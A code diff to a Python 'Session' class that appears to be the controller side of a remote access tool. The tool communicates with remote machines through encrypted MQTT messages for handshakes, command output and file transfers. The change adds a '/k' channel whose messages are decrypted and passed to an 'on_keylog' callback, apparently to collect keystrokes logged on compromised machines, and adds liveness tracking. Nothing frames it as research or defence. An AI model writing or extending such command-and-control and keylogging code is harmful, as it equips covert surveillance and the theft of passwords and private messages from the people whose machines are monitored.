@@ -75,12 +75,16 @@ class Session:
 		self.kit_pub = bytes.fromhex(kit_pub) if kit_pub else PUBBACKUP
 		self.txctr = 1
 		self.rxctr = 1
+		self.krxctr = 1
 		self.file_txctr = 1
+		self.last_seen = time.time()
+		self.alive = True
 		self.handshakes = queue.Queue(maxsize=1)
 		self.acks = queue.Queue(maxsize=1)
 		self.file_acks = queue.Queue(maxsize=1)
 		self.outputs = queue.Queue()
 		self.on_output = on_output
+		self.on_keylog = None
 
 		self.mqtt = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, transport="websockets", client_id=f"{mid}o{os.urandom(2).hex()}")
 		self.mqtt.ws_set_options(path=f"/?t={token}" if token else "/")
@@ -109,11 +113,12 @@ class Session:
 			raise OSError("handshake ack timeout")
 
 	def onconnect(self, client, userdata, flags, rc, props):
-		client.subscribe([(f"{self.base}/h", 1), (f"{self.base}/u", 1)])
+		client.subscribe([(f"{self.base}/h", 1), (f"{self.base}/u", 1), (f"{self.base}/k", 1)])
 
 	def onmsg(self, client, userdata, msg):
 		if msg.retain:
 			return
+		self.last_seen = time.time()
 		if msg.topic.endswith("/h") and msg.payload[:8] == HELLO:
 			try:
 				self.handshakes.put_nowait(handshake(msg.payload, self.kit_pub))
@@ -129,6 +134,15 @@ class Session:
 				self.file_acks.put_nowait(True)
 			except queue.Full:
 				pass
+		elif msg.topic.endswith("/k"):
+			try:
+				out = pysodium.crypto_secretbox_open(
+					msg.payload, secret_nonce(0x05, self.krxctr), self.rx_key)
+				self.krxctr += 1
+			except Exception:
+				return
+			if self.on_keylog:
+				self.on_keylog(out)
 		elif msg.topic.endswith("/u"):
 			try:
 				out = pysodium.crypto_secretbox_open(
@@ -196,5 +210,6 @@ class Session:
 
 
 	def close(self):
+		self.alive = False
 		self.mqtt.disconnect()
 		self.mqtt.loop_stop()
